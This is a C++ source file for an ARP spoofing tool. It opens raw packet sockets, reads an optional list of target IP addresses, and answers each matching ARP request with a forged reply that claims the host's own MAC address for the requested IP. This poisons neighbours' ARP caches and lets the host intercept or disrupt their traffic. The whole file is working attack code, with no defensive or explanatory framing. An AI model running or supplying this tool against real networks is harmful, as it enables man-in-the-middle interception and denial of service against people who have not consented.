#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <netinet/if_ether.h>
#include <arpa/inet.h>
#include "arp_spoof.h"
#include "avltree.h"


#define MAC_ADDR_BUFFER_SIZE    18
#define FILE_NAME_SIZE          128
#ifndef ETHER_ADDR_LEN
#define ETHER_ADDR_LEN 6
#endif /*ETHER_ADDR_LEN*/
#ifndef IP_ADDR_LEN
#define IP_ADDR_LEN 4
#endif /*IP_ADDR_LEN*/
#ifndef ARP_LEN
#define ARP_LEN			(sizeof(struct ether_header) + sizeof(struct ether_arp))
#endif /*ARP_LEN*/


bool arp_spoof::hw_address(const char* const ifname, unsigned char* const hw_address){
    FILE *file;
    char hw[MAC_ADDR_BUFFER_SIZE]={0};
    char filename[FILE_NAME_SIZE]={0};

    sprintf(filename, "/sys/class/net/%s/address", ifname);
    file = fopen(filename, "r");
    if(file == NULL){
        return false;
    }
    fgets(hw, MAC_ADDR_BUFFER_SIZE, file);
    fclose(file);
    if(sscanf(hw, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &hw_address[0], &hw_address[1], &hw_address[2], &hw_address[3], &hw_address[4], &hw_address[5]) != ETHER_ADDR_LEN){
        return false;
    }
    return true;
}

arp_spoof*	arp_spoof::_instance = NULL;

arp_spoof* arp_spoof::instance(){
    if(_instance){
        return _instance;
    }
    while((_instance = new arp_spoof) == NULL){
        sleep(1);
    }
    return _instance;
}

void arp_spoof::do_arp_spoof(const char *ifname, const char *filename){
    avltree<unsigned int, unsigned char> target_ip_list;
    unsigned char hw_addr[ETHER_ADDR_LEN] = {0,};
    ether_header* const rx_eth_hdr = (ether_header*)_rx_buffer;
    ether_arp* const rx_arp_hdr= (ether_arp*)(_rx_buffer+sizeof(ether_header));
    ether_header* const tx_eth_hdr = (ether_header *)_tx_buffer;
    ether_arp* const tx_arp_hdr = (ether_arp *)(_tx_buffer + sizeof(ether_header));

    if(ifname == NULL){
        return;
    }

    if(ifname != NULL){
        while(hw_address(ifname, hw_addr) == false);
        while(setsockopt(_rx_socket, SOL_SOCKET, SO_BINDTODEVICE, ifname, strlen(ifname)) != 0);
    }
    if(filename != NULL){
        FILE * file;
        char ip_str[16] = {0};
        unsigned int ip;
        while((file = fopen (filename,"r")) == NULL);
        while(fgets(ip_str, sizeof(ip_str), file) != NULL){
            if(sscanf(ip_str, "%hhu.%hhu.%hhu.%hhu", (unsigned char*)&ip, (unsigned char*)&ip+1, (unsigned char*)&ip+2, (unsigned char*)&ip+3) != 4){
                continue;
            }
            target_ip_list.insert(ip, 0);
        }
        fclose(file);
    }

    while(1){
        int received_bytes, sent_bytes;
        sockaddr_ll ifaddr;
        memset(_rx_buffer, 0x00, ARP_LEN);// Initialize the rx buffer.
        received_bytes = read(_instance->_rx_socket, _rx_buffer, ARP_LEN);// Receive a packet.
        if(received_bytes <=  0){
            continue;
        }
        if(target_ip_list.size() > 0){
            if(target_ip_list.find(*((unsigned int*)rx_arp_hdr->arp_tpa)) == NULL){
                continue;
            }
        }

        // make reply packet;
        // ethernet header
        memcpy(tx_eth_hdr->ether_dhost, rx_eth_hdr->ether_shost, ETHER_ADDR_LEN);// set destination mac address of reply packet with the source mac address of the request packet.
        memcpy(tx_eth_hdr->ether_shost, hw_addr, ETHER_ADDR_LEN);
        tx_eth_hdr->ether_type = htons(ETH_P_ARP);

        // arp header
        tx_arp_hdr->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);	//Format of hardware address
        tx_arp_hdr->ea_hdr.ar_pro = htons(ETH_P_IP);		//Format of protocol address.
        tx_arp_hdr->ea_hdr.ar_hln = ETHER_ADDR_LEN;		//Length of hardware address.
        tx_arp_hdr->ea_hdr.ar_pln = IP_ADDR_LEN;		//Length of protocol address.
        tx_arp_hdr->ea_hdr.ar_op = htons(ARPOP_REPLY);	//ARP operation : REPLY
        memcpy(tx_arp_hdr->arp_sha, hw_addr, ETHER_ADDR_LEN);// set source mac address of the reply packet with mac address of this machine.
        memcpy(tx_arp_hdr->arp_spa, rx_arp_hdr->arp_tpa, IP_ADDR_LEN);// set source IP address of the reply packet with the target IP address of the request packet.
        memcpy(tx_arp_hdr->arp_tha, rx_eth_hdr->ether_shost, ETHER_ADDR_LEN);// set target mac address with the source mac address of the request packet.
        memcpy(tx_arp_hdr->arp_tpa, rx_arp_hdr->arp_spa, IP_ADDR_LEN);// set target IP address of the reply packet with the source IP address of the request packet.

        // sockaddr_ll
        memset(&ifaddr, 0, sizeof(ifaddr));
        ifaddr.sll_ifindex = if_nametoindex(ifname); //Interface number
        ifaddr.sll_family = AF_PACKET;
        memcpy(ifaddr.sll_addr, hw_addr, ETHER_ADDR_LEN); //Physical layer address
        ifaddr.sll_halen = htons(ETHER_ADDR_LEN); //Length of address

        sent_bytes = sendto(_tx_socket, _tx_buffer, ARP_LEN, 0, (struct sockaddr *) &ifaddr, sizeof(ifaddr));
        if(sent_bytes == ARP_LEN){
            printf("Sent ARP reply for %hhu.%hhu.%hhu.%hhu to %hhu.%hhu.%hhu.%hhu\n",
                   rx_arp_hdr->arp_tpa[0], rx_arp_hdr->arp_tpa[1], rx_arp_hdr->arp_tpa[2], rx_arp_hdr->arp_tpa[3],
                   rx_arp_hdr->arp_spa[0], rx_arp_hdr->arp_spa[1], rx_arp_hdr->arp_spa[2], rx_arp_hdr->arp_spa[3]);
        }
    }
}

arp_spoof::arp_spoof(){
    printf("%s : Start\n", __func__);
    while((_rx_socket = socket(PF_PACKET, SOCK_PACKET, htons(ETH_P_ARP))) < 0);
    printf("%s : Open a rx socket\n", __func__);

    while((_tx_socket = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) < 0);
    printf("%s : Open a tx socket\n", __func__);

    while((_rx_buffer = new char[ARP_LEN]) == NULL);
    printf("%s : Allocate rx buffer [size=%u]\n", __func__, ARP_LEN);

    while((_tx_buffer = new char[ARP_LEN]) == NULL);
    printf("%s : Allocate tx buffer [size=%u]\n", __func__, ARP_LEN);

    printf("%s : All done\n", __func__);

}

arp_spoof::~arp_spoof(){
    close(_rx_socket);
    close(_tx_socket);
}

